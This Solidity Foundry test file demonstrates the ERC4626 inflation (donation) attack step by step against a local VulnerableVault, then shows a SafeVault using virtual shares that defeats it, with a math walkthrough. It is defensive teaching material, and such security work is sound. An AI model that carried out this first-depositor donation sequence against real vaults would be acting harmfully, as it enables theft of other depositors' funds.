// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ============================================================
// HAL-01: ERC4626 Inflation Attack PoC
// Category : Precision / Rounding Exploit
// Reference: EIP-4626 Inflation Attack (donation attack)
// Technique: Share price manipulation via direct token donation
//            + integer division truncation to steal deposits
// ============================================================

import "forge-std/Test.sol";
import "../src/Arithmetic & Precision Attacks/ERC4626 Inflation Attack/VulnerableVault.sol";
import "../src/Arithmetic & Precision Attacks/ERC4626 Inflation Attack/SafeVault.sol";

contract InflationAttackPoC is Test {
    // ── Contracts ───────────────────────────────────────────
    MockToken   internal token;
    VulnerableVault internal vulnVault;
    SafeVault       internal safeVault;

    // ── Actors ──────────────────────────────────────────────
    address internal attacker = makeAddr("attacker");
    address internal victim   = makeAddr("victim");

    // ── Constants ───────────────────────────────────────────
    uint256 internal constant DONATE_AMOUNT  = 10_000e18;   // attacker's inflation donation
    uint256 internal constant VICTIM_DEPOSIT = 19_999e18;   // victim's deposit amount

    // ════════════════════════════════════════════════════════
    function setUp() public {
        token     = new MockToken();
        vulnVault = new VulnerableVault(address(token));
        safeVault = new SafeVault(address(token));

        // Fund actors
        token.mint(attacker, DONATE_AMOUNT + 1e18);
        token.mint(victim,   VICTIM_DEPOSIT);
    }

    // ════════════════════════════════════════════════════════
    //  === Scene 1: Inflation Attack on VulnerableVault ===
    // ════════════════════════════════════════════════════════
    function test_InflationAttack_VulnerableVault() public {
        console.log("=== Scene 1: Inflation Attack on VulnerableVault ===");
        console.log("");

        // ── Initial State ────────────────────────────────────
        console.log("--- Step 0: Initial balances");
        console.log("attacker token balance", token.balanceOf(attacker));
        console.log("victim   token balance", token.balanceOf(victim));
        console.log("");

        // ── Step 1: Attacker first deposit (1 wei) ───────────
        console.log("--- Step 1: Attacker deposits 1 wei as first depositor");
        vm.startPrank(attacker);
        token.approve(address(vulnVault), type(uint256).max);
        uint256 attackerShares = vulnVault.deposit(1, attacker);
        vm.stopPrank();

        console.log("attacker shares received", attackerShares);
        console.log("vault totalSupply", vulnVault.totalSupply());
        console.log("vault totalAssets", vulnVault.totalAssets());
        console.log("share price (e18)", vulnVault.sharePriceE18());
        console.log("");

        // ── Step 2: Attacker donates to inflate share price ──
        console.log("--- Step 2: Attacker donates 10000e18 - 1 tokens directly");
        vm.prank(attacker);
        token.transfer(address(vulnVault), DONATE_AMOUNT - 1);

        console.log("vault totalAssets after donation", vulnVault.totalAssets());
        console.log("vault totalSupply (unchanged)", vulnVault.totalSupply());
        console.log("share price (e18) inflated", vulnVault.sharePriceE18());
        console.log("");

        // ── Step 3: Victim previews and deposits ─────────────
        console.log("--- Step 3: Victim deposits 19999e18");
        uint256 expectedShares = vulnVault.previewDeposit(VICTIM_DEPOSIT);
        console.log("victim expected shares (previewDeposit)", expectedShares);

        vm.startPrank(victim);
        token.approve(address(vulnVault), VICTIM_DEPOSIT);
        uint256 victimShares = vulnVault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        console.log("victim actual shares received", victimShares);
        console.log("vault totalSupply now", vulnVault.totalSupply());
        console.log("vault totalAssets now", vulnVault.totalAssets());
        console.log("");

        // ── Step 4: Attacker redeems ─────────────────────────
        console.log("--- Step 4: Attacker redeems all shares");
        uint256 attackerTokenBefore = token.balanceOf(attacker);

        vm.startPrank(attacker);
        uint256 attackerReceived = vulnVault.redeem(attackerShares, attacker);
        vm.stopPrank();

        uint256 attackerTokenAfter = token.balanceOf(attacker);

        console.log("attacker tokens received from redeem", attackerReceived);
        console.log("attacker net profit (tokens)", attackerTokenAfter - attackerTokenBefore);
        console.log("");

        // ── Step 5: Victim redeems ───────────────────────────
        console.log("--- Step 5: Victim redeems all shares");
        uint256 victimTokenBefore = token.balanceOf(victim);

        vm.startPrank(victim);
        uint256 victimReceived = vulnVault.redeem(victimShares, victim);
        vm.stopPrank();

        uint256 victimTokenAfter = token.balanceOf(victim);

        console.log("victim tokens received from redeem", victimReceived);
        console.log("victim net loss (tokens)", VICTIM_DEPOSIT - victimTokenAfter);
        console.log("");

        // ── Assertions ───────────────────────────────────────
        // Victim should only get 1 share due to truncation
        assertEq(victimShares, 1, "victim must only receive 1 share");
        // Attacker profits
        assertGt(attackerTokenAfter, attackerTokenBefore + DONATE_AMOUNT - 1,
            "attacker must profit more than donation cost");
        // Victim loses funds (should get back less than deposited)
        assertLt(victimReceived, VICTIM_DEPOSIT,
            "victim must lose funds");

        console.log("=== Attack confirmed: victim lost funds, attacker profited ===");
    }

    // ════════════════════════════════════════════════════════
    //  === Scene 2: Same Attack Fails on SafeVault ===
    // ════════════════════════════════════════════════════════
    function test_InflationAttack_SafeVault_Defended() public {
        console.log("=== Scene 2: Same Attack Attempt on SafeVault ===");
        console.log("");

        // ── Step 1: Attacker first deposit ───────────────────
        console.log("--- Step 1: Attacker deposits 1 wei");
        vm.startPrank(attacker);
        token.approve(address(safeVault), type(uint256).max);
        uint256 attackerShares = safeVault.deposit(1, attacker);
        vm.stopPrank();

        console.log("attacker shares received", attackerShares);
        console.log("share price (e18)", safeVault.sharePriceE18());
        console.log("");

        // ── Step 2: Attacker donates ─────────────────────────
        console.log("--- Step 2: Attacker donates 10000e18 - 1 tokens");
        vm.prank(attacker);
        token.transfer(address(safeVault), DONATE_AMOUNT - 1);

        console.log("share price (e18) after donation", safeVault.sharePriceE18());
        console.log("");

        // ── Step 3: Victim deposits ───────────────────────────
        console.log("--- Step 3: Victim deposits 19999e18");
        uint256 expectedShares = safeVault.previewDeposit(VICTIM_DEPOSIT);
        console.log("victim expected shares (previewDeposit)", expectedShares);

        vm.startPrank(victim);
        token.approve(address(safeVault), VICTIM_DEPOSIT);
        uint256 victimShares = safeVault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        console.log("victim actual shares received", victimShares);
        console.log("");

        // ── Step 4: Attacker redeems ─────────────────────────
        console.log("--- Step 4: Attacker redeems");
        uint256 attackerBefore = token.balanceOf(attacker);

        vm.startPrank(attacker);
        safeVault.redeem(attackerShares, attacker);
        vm.stopPrank();

        uint256 attackerAfter = token.balanceOf(attacker);
        int256 attackerPnL = int256(attackerAfter) - int256(attackerBefore) - int256(DONATE_AMOUNT - 1);

        console.log("attacker PnL after accounting for donation cost (negative = loss)");
        // Can't log int256 directly, use cast
        if (attackerPnL >= 0) {
            console.log("attacker net gain", uint256(attackerPnL));
        } else {
            console.log("attacker net loss", uint256(-attackerPnL));
        }
        console.log("");

        // ── Assertions ───────────────────────────────────────
        // Victim should get meaningful shares (not truncated to 1)
        assertGt(victimShares, 1, "victim must receive more than 1 share");
        // Attacker should not profit (after accounting for donation cost)
        assertLe(attackerPnL, int256(0),
            "attacker must not profit from the attack");

        console.log("=== Defense confirmed: virtual shares neutralized inflation attack ===");
    }

    // ════════════════════════════════════════════════════════
    //  === Scene 3: Math Walkthrough (no state change) ===
    // ════════════════════════════════════════════════════════
    function test_MathWalkthrough() public pure {
        console.log("=== Scene 3: Step-by-step Math Walkthrough ===");
        console.log("");

        // --- Vulnerable vault math ---
        console.log("--- Vulnerable Vault Math");

        uint256 totalAssets_after_donate = 10_000e18;  // 1 + (10000e18 - 1)
        uint256 totalSupply_after_donate = 1;

        uint256 victim_deposit = 19_999e18;
        // shares = victim_deposit * totalSupply / totalAssets
        uint256 victim_shares = (victim_deposit * totalSupply_after_donate) / totalAssets_after_donate;
        console.log("victim shares formula result", victim_shares);

        // After victim deposit:
        uint256 new_totalAssets = totalAssets_after_donate + victim_deposit;
        uint256 new_totalSupply = totalSupply_after_donate + victim_shares; // = 2

        // Attacker redeems 1 share:
        uint256 attacker_gets = (1 * new_totalAssets) / new_totalSupply;
        uint256 attacker_cost = 1 + (10_000e18 - 1); // initial 1 wei + donation
        console.log("attacker redeems and gets", attacker_gets);
        console.log("attacker total cost was", attacker_cost);
        console.log("attacker profit", attacker_gets - attacker_cost);
        console.log("");

        // --- Safe vault math ---
        console.log("--- Safe Vault Math (virtual shares = 1000, virtual assets = 1)");

        uint256 VIRTUAL_SHARES = 1e3;
        uint256 VIRTUAL_ASSETS = 1;

        // After attacker deposits 1 wei and donates:
        uint256 safe_totalAssets = 10_000e18;
        uint256 safe_totalSupply = 1; // only 1 real share minted

        // victim shares = deposit * (supply + VIRTUAL_SHARES) / (totalAssets + VIRTUAL_ASSETS)
        uint256 safe_victim_shares = (victim_deposit * (safe_totalSupply + VIRTUAL_SHARES))
            / (safe_totalAssets + VIRTUAL_ASSETS);
        console.log("victim shares in safe vault", safe_victim_shares);
        console.log("victim gets meaningful shares, attack fails");
    }
}
